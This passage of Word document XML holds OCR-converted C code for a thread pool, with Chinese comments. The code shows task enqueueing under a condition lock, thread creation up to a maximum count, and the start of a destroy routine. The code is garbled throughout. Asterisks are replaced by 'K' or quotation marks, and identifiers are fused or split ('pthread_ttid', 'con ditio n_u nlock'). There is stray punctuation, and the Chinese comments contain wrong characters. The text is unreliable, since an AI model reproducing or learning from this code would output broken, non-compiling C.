        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">run)(void </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">arg), void </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>arg) (</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃产生一个新的任务</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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 xml:space="preserve">task_t "newtask = (task_t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>)malloc(sizeof(task_t));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>newtask-&gt;run = run;</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newtask-&gt;arg = arg;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>newtask-&gt;next=NULL;//ifi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>加的任务放在队列尾湍</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">〃线程她的状态被多个线程共享，操作前需要加成 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_lock(&amp;pool-&gt;ready);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if(pool-&gt;first== NULL)// </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>第一个仁务加入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="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560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">pool-&gt;first </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>newtask;</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180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>else</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40" w:lineRule="auto"/>
        <w:ind w:left="1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-&gt;last-&gt;next = newtask;</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360" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">pool-&gt;last = newtask; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃队列尾指向新加入的线程</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃线程她中有线程空闲，唤醒</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if(pool-&gt;idle </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&gt; 0)</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0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_signal(&amp;pool-&gt; ready);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="285" w:lineRule="exact"/>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285" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">〃当前线程她中线程个数没有达到设定的最大值，创建一个新的线性 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">else if(pool-&gt;counter </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pool-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>max_threads)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>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1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pthread_ttid;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1560" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pthread_create(&amp;tid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> NULL, thread_routine, pool); pool-〉counter++;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃结束，访问</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>con ditio n_u nlock(&amp;p ool -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>〉</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ready);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="300"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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃线程她销毁</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void threadpool_destroy(threadpool_t "pool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃如果已经调用销毁，直接返回</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if(pool-&gt;quit)</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return;</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>//加锁</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_lock(&amp;pool-&gt;ready);</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃设置徜毁标记为1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">pool-&gt;quit </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>= 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃线程她中线程个数大于0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1180" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:sectPr>
          <w:headerReference r:id="rId15" w:type="default"/>
          <w:headerReference r:id="rId16" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1475" w:right="1650" w:bottom="1460" w:left="1714" w:header="0" w:footer="1032" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if(pool-&gt;counter </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&gt; 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">〃对于等待的线程，发送信号唤阻 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if(pool-&gt;idle </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>&gt; 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="270" w:lineRule="exact"/>
        <w:ind w:left="2000" w:right="0" w:hanging="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>( condition_broadcast(&amp;pool-&gt;ready);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="16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20" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>〃正</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">在执行任务的线程，等待他们结束任务 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>while(pool-&gt;counter)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="16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2000" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_wait(&amp;pool-&gt; ready);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="300" w:lineRule="exact"/>
